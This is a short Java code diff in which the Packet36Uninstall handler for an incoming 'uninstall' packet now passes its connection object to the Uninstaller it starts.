@@ -7,7 +7,7 @@ public class Packet36Uninstall extends AbstractIncomingPacket {
 
 	@Override
 	public void read(Connection con) throws Exception {
-		new Uninstaller().start();
+		new Uninstaller(con).start();
 	}
 
 }
